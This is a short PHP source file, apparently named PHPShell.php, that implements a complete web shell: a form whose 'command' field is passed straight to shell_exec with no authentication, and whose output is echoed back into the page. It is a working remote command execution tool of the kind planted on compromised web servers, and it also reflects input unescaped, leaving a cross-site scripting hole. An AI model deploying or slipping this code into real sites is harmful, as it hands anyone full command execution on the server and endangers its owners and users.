<?php
    $Output = '';
    if(isset($_POST['command'])) {
        $Command = $_POST['command'] . ' 2>&1';
        $Output = shell_exec($_POST['command']);
        $Output = '<span>>> ' . $_POST['command'] . '</span><br />' .
                  ' <pre>' . $Output . '</pre><br />';

        if(isset($_POST['output'])) {
            $Output = $Output . $_POST['output'];
        }
    }

    echo '<html><head><title>PHP Shell</title>' .
         '<style type="text/css">' .
         ' body {' .
         '   background-color: #eeeeec; }' .
         ' #form {' .
         '   width: 400px;' .
         '   margin-left: auto;' .
         '   margin-right: auto; }' .
         ' #form fieldset {' .
         '   border: 1px solid #000; }' .
         ' #form input {' .
         '   margin: 2px; height: 25px; }' .
         ' #output {' .
         '   width: 380px;' .
         '   max-width: 100%;' .
         '   margin-left: auto;' .
         '   margin-right: auto;' .
         '   border: 1px solid #000;' .
         '   min-height: 200px; }' .
         ' #output span {' .
         '   color: #739DBB; } ' .
         '</style>' .
         '</head><body>' .
         '<form id="form" method="post"' .
         ' action="PHPShell.php"><fieldset>' .
         '<legend>Command</legend>' .
         '<input type="text" name="command" width="50" />' .
         '<input type="hidden" name="output" value="' .
         str_replace('"', "'", $Output) . '" />' .
         '<input type="submit" name="submit" value="Execute" />' .
         '</fieldset></form><fieldset id="output"><legend>' .
         'Command Output</legend>' . $Output . '</fieldset></div>' .
         '</body></html>';
?>
